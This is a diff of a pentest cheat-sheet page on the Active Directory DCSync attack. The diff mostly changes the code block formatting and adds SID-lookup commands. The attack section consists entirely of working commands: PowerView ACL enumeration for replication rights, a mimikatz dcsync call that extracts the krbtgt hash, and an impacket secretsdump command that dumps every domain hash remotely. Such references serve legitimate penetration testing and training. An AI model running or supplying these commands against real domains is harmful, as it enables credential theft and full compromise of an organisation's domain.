@@ -12,14 +12,19 @@ The only pre-requisite to worry about is that you have an account with **rights*
 
 ## Attack
 
-```powershell
-'''
+<pre class="language-powershell"><code class="lang-powershell">'''
 WINDOWS - locally
 '''
-# check privileges
-Get-ObjectAcl -DistinguishedName "dc=fcorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
-# or
-Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
+# enumerate users with the required privileges
+Get-ObjectACL "DC=security,DC=local" -ResolveGUIDs | ? {
+    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
+}
+<strong># or
+</strong>Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
+
+# Take the SID and attempt to identify the UPN : 
+Get-ADUser -Identity S-1-5-21-2543357152-2466851693-2862170513-1121
+Get-ADGroup -Identity S-1-5-21-2543357152-2466851693-2862170513-527
 
 # if OK, mimikatz :
 lsadump::dcsync /domain:fcorp.local /user:krbtgt
@@ -32,4 +37,4 @@ LINUX - remotely
 '''
 # user with dcsync
 secretsdump.py -just-dc $user:$passwd@$ip -outputfile dcsync_hashes
-```
+</code></pre>
